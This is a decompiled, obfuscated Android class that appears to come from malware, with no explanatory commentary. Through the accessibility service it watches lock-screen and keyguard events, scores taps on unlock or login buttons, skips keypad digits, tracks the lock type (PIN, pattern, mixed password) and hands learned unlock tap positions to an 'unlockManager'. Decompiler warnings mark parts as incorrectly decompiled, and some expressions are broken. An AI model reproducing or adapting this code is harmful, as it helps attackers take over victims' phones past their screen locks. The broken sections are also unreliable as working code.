package p000;

import android.graphics.Rect;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;
import kotlin.text.AbstractC0779a1;
import kotlin.text.Regex;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class da0 {

    /* renamed from: a0 */
    public final dqtvuisjd f55593a0;

    /* renamed from: a1 */
    public final dqtvuisjd f55594a1;

    /* renamed from: a2 */
    public final x81 f55595a2;

    /* renamed from: a3 */
    public long f55596a3;

    /* renamed from: a4 */
    public String f55597a4;

    /* renamed from: a5 */
    public long f55598a5;

    /* renamed from: a6 */
    public volatile boolean f55599a6;

    /* renamed from: a7 */
    public final Handler f55600a7;

    /* renamed from: a8 */
    public final RunnableC0941o6 f55601a8;

    /* renamed from: a9 */
    public final AtomicInteger f55602a9;

    /* renamed from: b0 */
    public final AtomicInteger f55603b0;

    static {
        new ca0(null);
    }

    public da0(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2, x81 x81Var) {
        t60.m214695b6(x81Var, "unlockManager");
        this.f55593a0 = dqtvuisjdVar;
        this.f55594a1 = dqtvuisjdVar2;
        this.f55595a2 = x81Var;
        this.f55597a4 = "unknown";
        HandlerThread handlerThread = new HandlerThread("LearningBg");
        handlerThread.start();
        this.f55600a7 = new Handler(handlerThread.getLooper());
        this.f55601a8 = new RunnableC0941o6(13, this);
        this.f55602a9 = new AtomicInteger(0);
        this.f55603b0 = new AtomicInteger(0);
    }

    /* renamed from: a0 */
    public final float m212573a0(AccessibilityNodeInfo accessibilityNodeInfo, float f, float f2, String str, String str2) {
        String lowerCase;
        String string;
        float f3 = (!this.f55599a6 || System.currentTimeMillis() > this.f55598a5) ? 0.0f : 0.4f;
        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.m212602a1(), AbstractC0716jf.m213306g5("登录", "解锁", "login", "unlock", "→", "✓", "√", "⏎", "↵"));
        Locale locale = Locale.ROOT;
        String lowerCase2 = str.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String lowerCase3 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        if (!arrayListM213298i5.isEmpty()) {
            int size = arrayListM213298i5.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayListM213298i5.get(i);
                i++;
                String str3 = (String) obj;
                if (AbstractC0779a1.m213652a5(lowerCase2, str3, false) || AbstractC0779a1.m213652a5(lowerCase3, str3, false)) {
                    f3 += 0.5f;
                    break;
                }
            }
        }
        dqtvuisjd dqtvuisjdVar = this.f55593a0;
        int i2 = dqtvuisjdVar.getResources().getDisplayMetrics().widthPixels;
        float f4 = dqtvuisjdVar.getResources().getDisplayMetrics().heightPixels;
        float f5 = f2 > f4 * 0.5f ? 0.2f : 0.0f;
        float f6 = i2;
        if (f > 0.5f * f6) {
            f5 += 0.1f;
        }
        if (f > f6 * 0.6f && f2 > 0.7f * f4 && f2 < f4 * 0.95f) {
            f5 += 0.2f;
        }
        float f7 = f3 + f5;
        if (accessibilityNodeInfo.isClickable()) {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                lowerCase = "";
            } else {
                lowerCase = string.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            if (AbstractC0779a1.m213652a5(lowerCase, "button", false) || AbstractC0779a1.m213652a5(lowerCase, "imageview", false) || AbstractC0779a1.m213652a5(lowerCase, "textview", false) || AbstractC0779a1.m213652a5(lowerCase, "view", false)) {
                f7 += 0.3f;
            }
        }
        String lowerCase4 = this.f55597a4.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase4, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        return f7 + (lowerCase4.equals("mixed") ? true : lowerCase4.equals("混合密码") ? 0.2f : 0.0f);
    }

    /* renamed from: a1 */
    public final void m212574a1(final float f, final float f2, final String str, final String str2, float f3) {
        dqtvuisjd dqtvuisjdVar = this.f55593a0;
        try {
            this.f55602a9.incrementAndGet();
            final float fM19a0 = AbstractC0003a2.m19a0(f3, 0.5f, 2.0f, 1.0f);
            final String str3 = f3 > 0.9f ? "high_confidence_manual" : (f3 <= 0.7f || !AbstractC0779a1.m213652a5(this.f55597a4, "mixed", false)) ? f3 > 0.7f ? "confident_manual" : "manual" : "mixed_password_manual";
            this.f55595a2.m215136a8(f, f2, str3, fM19a0, dqtvuisjdVar.getResources().getDisplayMetrics().widthPixels, dqtvuisjdVar.getResources().getDisplayMetrics().heightPixels, str, str2);
            this.f55600a7.postDelayed(new Runnable() { // from class: ba0
                @Override // java.lang.Runnable
                public final void run() {
                    float f4 = fM19a0;
                    String str4 = str3;
                    float f5 = f;
                    float f6 = f2;
                    String str5 = str;
                    String str6 = str2;
                    da0 da0Var = this.f45761a0;
                    dqtvuisjd dqtvuisjdVar2 = da0Var.f55593a0;
                    AtomicInteger atomicInteger = da0Var.f55603b0;
                    try {
                        if (da0Var.f55595a2.m215134a6()) {
                            atomicInteger.incrementAndGet();
                            da0Var.f55595a2.m215136a8(f5, f6, str4.concat("_validated"), 0.3f + f4, dqtvuisjdVar2.getResources().getDisplayMetrics().widthPixels, dqtvuisjdVar2.getResources().getDisplayMetrics().heightPixels, str5, str6);
                            int i = da0Var.f55602a9.get();
                            t60.m214702c3("LearningManager", "学习成功率: " + ((int) ((i > 0 ? atomicInteger.get() / i : 0.0f) * 100)) + "%");
                        }
                    } catch (Exception e) {
                        t60.m214705c6("LearningManager", "学习验证失败", e);
                    }
                }
            }, 2000L);
        } catch (Exception e) {
            t60.m214705c6("LearningManager", "❌ 执行学习失败", e);
        }
    }

    /* renamed from: a2 */
    public final void m212575a2(AccessibilityEvent accessibilityEvent, AccessibilityNodeInfo accessibilityNodeInfo) {
        String lowerCase;
        String string;
        String string2;
        String string3;
        try {
            CharSequence packageName = accessibilityEvent.getPackageName();
            if (packageName == null || (string3 = packageName.toString()) == null) {
                lowerCase = "";
            } else {
                lowerCase = string3.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            if (AbstractC0779a1.m213652a5(lowerCase, "systemui", false) || AbstractC0779a1.m213652a5(lowerCase, "lockscreen", false) || AbstractC0779a1.m213652a5(lowerCase, "keyguard", false) || AbstractC0779a1.m213652a5(lowerCase, "lock", false)) {
                Rect rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                float fCenterX = rect.centerX();
                float fCenterY = rect.centerY();
                CharSequence text = accessibilityNodeInfo.getText();
                String str = (text == null || (string2 = text.toString()) == null) ? "" : string2;
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                String str2 = (contentDescription == null || (string = contentDescription.toString()) == null) ? "" : string;
                if (m212576a3(fCenterX, fCenterY, str, str2)) {
                    return;
                }
                String str3 = str2;
                String str4 = str;
                float fM212573a0 = m212573a0(accessibilityNodeInfo, fCenterX, fCenterY, str4, str3);
                if (fM212573a0 > 0.5f) {
                    m212574a1(fCenterX, fCenterY, str4, str3, fM212573a0);
                }
            }
        } catch (Exception e) {
            t60.m214705c6("LearningManager", "❌ 记录点击事件学习失败", e);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:31:0x007a  */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m212576a3(float f, float f2, String str, String str2) {
        boolean z;
        boolean z2;
        b60 b60Var;
        dqtvuisjd dqtvuisjdVar = this.f55593a0;
        try {
            float f3 = dqtvuisjdVar.getResources().getDisplayMetrics().widthPixels;
            float f4 = 0.15f * f3;
            float f5 = 0.85f * f3;
            float f6 = dqtvuisjdVar.getResources().getDisplayMetrics().heightPixels;
            z = f >= f4 && f <= f5 && f2 >= 0.35f * f6 && f2 <= 0.75f * f6;
            z2 = f >= f3 * 0.65f && f <= f3 * 0.95f && f2 >= 0.65f * f6 && f2 <= f6 * 0.8f;
            b60Var = this.f55594a1.f52420f1;
        } catch (Exception e) {
            tz0.m214810b0("检查数字密码输入状态时出错: ", e.getMessage(), "LearningManager");
        }
        if (b60Var != null) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            long j = b60Var.f45725a3;
            boolean z3 = j > 0 && jCurrentTimeMillis - j <= 5000;
            if (!z && !z2 && !z3) {
                Locale locale = Locale.ROOT;
                String lowerCase = str.toLowerCase(locale);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                String lowerCase2 = str2.toLowerCase(locale);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (!new Regex("^[0-9]$").m213646a2(lowerCase) && !new Regex("^[0-9]$").m213646a2(lowerCase2)) {
                    Iterator it = AbstractC0716jf.m213306g5("enter", "return", "回车", "确认", "入力", "엔터", "delete", "del", "backspace", "删除", "退格", "削除", "Delete", "Backspace", "space", "空格", " ", "スペース", "shift", "caps", "大小写", "alt", "ctrl", "fn", "abc", "123", "符号", "symbol", "next", "done", "go", "search").iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            int i = dqtvuisjdVar.getResources().getDisplayMetrics().widthPixels;
                            int i2 = dqtvuisjdVar.getResources().getDisplayMetrics().heightPixels;
                            if (f < 50.0f || f2 < 50.0f || f > i - 50 || f2 > i2 - 50 || f2 < i2 * 0.1f) {
                                break;
                            }
                            return false;
                        }
                        String str3 = (String) it.next();
                        if (AbstractC0779a1.m213652a5(lowerCase, str3, false) || AbstractC0779a1.m213652a5(lowerCase2, str3, false)) {
                            break;
                        }
                    }
                }
            }
        }
        return true;
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX WARN: Removed duplicated region for block: B:24:0x007f  */
    /* JADX WARN: Removed duplicated region for block: B:30:0x0093  */
    /* JADX WARN: Removed duplicated region for block: B:31:0x0096  */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m212577a4(String str) {
        long j;
        Set<String> setM210734f7 = AbstractC0134bh.m210734f7(new String[]{"mixed", "混合密码", "text", "文本密码", "numeric", "数字密码", "pin", "pattern", "图形密码"});
        if (setM210734f7 == null || !setM210734f7.isEmpty()) {
            for (String str2 : setM210734f7) {
                Locale locale = Locale.ROOT;
                String lowerCase = str.toLowerCase(locale);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                String lowerCase2 = str2.toLowerCase(locale);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (AbstractC0779a1.m213652a5(lowerCase, lowerCase2, false)) {
                    this.f55596a3 = System.currentTimeMillis();
                    this.f55597a4 = str;
                    String lowerCase3 = str.toLowerCase(locale);
                    t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    switch (lowerCase3.hashCode()) {
                        case -2000413939:
                            if (lowerCase3.equals("numeric")) {
                                j = 3000;
                                break;
                            } else {
                                j = 4000;
                                break;
                            }
                        case 110997:
                            if (!lowerCase3.equals("pin")) {
                            }
                            break;
                        case 103910395:
                            if (lowerCase3.equals("mixed")) {
                                j = 6000;
                                break;
                            }
                            break;
                        case 796842786:
                            if (!lowerCase3.equals("数字密码")) {
                            }
                            break;
                        case 860078508:
                            if (lowerCase3.equals("混合密码")) {
                            }
                            break;
                    }
                    this.f55598a5 = this.f55596a3 + j;
                    this.f55599a6 = true;
                    this.f55600a7.removeCallbacks(this.f55601a8);
                    this.f55600a7.postDelayed(this.f55601a8, j);
                    return;
                }
            }
        }
    }
}
